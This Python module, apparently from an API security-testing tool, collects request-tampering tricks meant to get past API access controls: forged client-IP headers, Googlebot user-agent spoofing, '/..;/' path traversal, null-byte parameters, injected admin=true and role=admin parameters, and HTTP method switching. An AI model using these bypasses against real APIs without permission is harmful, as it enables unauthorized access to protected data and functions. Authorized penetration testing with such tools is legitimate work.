"""
Bypass Techniques Library
Bypass 技术库 - 绕过 API 安全限制
参考 0x727/ChkApi bypass 技术
"""

import random
import string
from typing import Dict, List, Any, Callable, Optional
from dataclasses import dataclass


@dataclass
class BypassTechnique:
    """Bypass 技术"""
    name: str
    description: str
    bypass_type: str  # status, header, path, parameter
    apply_func: Callable
    expected_status: int = 200


class BypassTechniques:
    """
    Bypass 技术集合
    
    支持的 Bypass 类型：
    1. 状态码 Bypass (301/302/401/404)
    2. Header Bypass
    3. 路径 Bypass
    4. 参数 Bypass
    """
    
    @staticmethod
    def get_random_ip() -> str:
        """生成随机 IP"""
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    @staticmethod
    def get_random_user_agent() -> str:
        """生成随机 User-Agent"""
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        ]
        return random.choice(agents)
    
    @staticmethod
    def get_all_techniques() -> List[BypassTechnique]:
        """获取所有 Bypass 技术"""
        return [
            # ========== Header Bypass ==========
            BypassTechnique(
                name="X-Forwarded-For IP",
                description="使用 X-Forwarded-For 头绕过 IP 限制",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Forwarded-For': BypassTechniques.get_random_ip()}
                }
            ),
            BypassTechnique(
                name="X-Real-IP",
                description="使用 X-Real-IP 头绕过",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Real-IP': BypassTechniques.get_random_ip()}
                }
            ),
            BypassTechnique(
                name="X-Originating-IP",
                description="使用 X-Originating-IP 头",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Originating-IP': BypassTechniques.get_random_ip()}
                }
            ),
            BypassTechnique(
                name="CF-Connecting-IP",
                description="Cloudflare Connecting-IP 头",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'CF-Connecting-IP': BypassTechniques.get_random_ip()}
                }
            ),
            BypassTechnique(
                name="User-Agent Spoofing",
                description="伪装成 Googlebot",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'}
                }
            ),
            BypassTechnique(
                name="Referer Spoofing",
                description="伪造 Referer 头",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'Referer': original.get('url', 'https://google.com')}
                }
            ),
            BypassTechnique(
                name="Requested-With XMLHttpRequest",
                description="添加 XMLHttpRequest 头绕过 CORS",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'X-Requested-With': 'XMLHttpRequest'}
                }
            ),
            BypassTechnique(
                name="Authorization Bearer",
                description="添加空的 Authorization 头",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'Authorization': 'Bearer '}
                }
            ),
            BypassTechnique(
                name="Content-Type JSON",
                description="强制 JSON Content-Type",
                bypass_type="header",
                apply_func=lambda original: {
                    'headers': {'Content-Type': 'application/json'}
                }
            ),
            
            # ========== Path Bypass ==========
            BypassTechnique(
                name="Add ..;/ to path",
                description="路径遍历绕过",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '') + '/..;/'
                }
            ),
            BypassTechnique(
                name="Double encode path",
                description="双 URL 编码绕过",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').replace('/', '%2F')
                }
            ),
            BypassTechnique(
                name="Add /./ to path",
                description="添加 /./ 绕过",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').replace('/api/', '/api/./')
                }
            ),
            BypassTechnique(
                name="Remove /v1/ prefix",
                description="移除版本前缀",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').replace('/v1/', '/')
                }
            ),
            BypassTechnique(
                name="Add /v2/ prefix",
                description="尝试 v2 版本",
                bypass_type="path",
                apply_func=lambda original: {
                    'path': original.get('path', '').replace('/api/', '/api/v2/')
                }
            ),
            
            # ========== Parameter Bypass ==========
            BypassTechnique(
                name="Add null byte to parameter",
                description="参数添加空字节",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {k: v + '\x00' for k, v in original.get('params', {}).items()}
                }
            ),
            BypassTechnique(
                name="Convert to array",
                description="参数转换为数组",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {k: [v] for k, v in original.get('params', {}).items()}
                }
            ),
            BypassTechnique(
                name="Add common admin parameters",
                description="添加管理员参数",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {
                        **original.get('params', {}),
                        'admin': 'true',
                        'role': 'admin',
                        'user_type': 'administrator'
                    }
                }
            ),
            
            # ========== HTTP Method Bypass ==========
            BypassTechnique(
                name="Change POST to GET",
                description="POST 改为 GET",
                bypass_type="method",
                apply_func=lambda original: {
                    'method': 'GET'
                }
            ),
            BypassTechnique(
                name="Change GET to POST",
                description="GET 改为 POST",
                bypass_type="method",
                apply_func=lambda original: {
                    'method': 'POST'
                }
            ),
            BypassTechnique(
                name="Change to PUT",
                description="使用 PUT 方法",
                bypass_type="method",
                apply_func=lambda original: {
                    'method': 'PUT'
                }
            ),
            BypassTechnique(
                name="Change to PATCH",
                description="使用 PATCH 方法",
                bypass_type="method",
                apply_func=lambda original: {
                    'method': 'PATCH'
                }
            ),
            BypassTechnique(
                name="Change to DELETE",
                description="使用 DELETE 方法",
                bypass_type="method",
                apply_func=lambda original: {
                    'method': 'DELETE'
                }
            ),
            
            # ========== Body Bypass ==========
            BypassTechnique(
                name="Send empty body",
                description="发送空请求体",
                bypass_type="body",
                apply_func=lambda original: {
                    'data': ''
                }
            ),
            BypassTechnique(
                name="JSON to Form",
                description="JSON 转为表单格式",
                bypass_type="body",
                apply_func=lambda original: {
                    'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
                    'data': original.get('data', '')
                }
            ),
            BypassTechnique(
                name="Add _method parameter",
                description="添加 _method 参数（Ruby on Rails）",
                bypass_type="parameter",
                apply_func=lambda original: {
                    'params': {
                        **original.get('params', {}),
                        '_method': 'POST'
                    }
                }
            ),
        ]
    
    @staticmethod
    def get_by_type(bypass_type: str) -> List[BypassTechnique]:
        """按类型获取 Bypass 技术"""
        return [t for t in BypassTechniques.get_all_techniques() if t.bypass_type == bypass_type]
    
    @staticmethod
    def get_header_bypass() -> List[BypassTechnique]:
        """获取 Header Bypass 技术"""
        return BypassTechniques.get_by_type("header")
    
    @staticmethod
    def get_path_bypass() -> List[BypassTechnique]:
        """获取 Path Bypass 技术"""
        return BypassTechniques.get_by_type("path")
    
    @staticmethod
    def get_parameter_bypass() -> List[BypassTechnique]:
        """获取 Parameter Bypass 技术"""
        return BypassTechniques.get_by_type("parameter")
    
    @staticmethod
    def get_method_bypass() -> List[BypassTechnique]:
        """获取 Method Bypass 技术"""
        return BypassTechniques.get_by_type("method")


def get_all_bypass_techniques() -> List[BypassTechnique]:
    """获取所有 Bypass 技术"""
    return BypassTechniques.get_all_techniques()


def get_bypass_technique(name: str) -> Optional[BypassTechnique]:
    """根据名称获取 Bypass 技术"""
    for technique in BypassTechniques.get_all_techniques():
        if technique.name == name:
            return technique
    return None
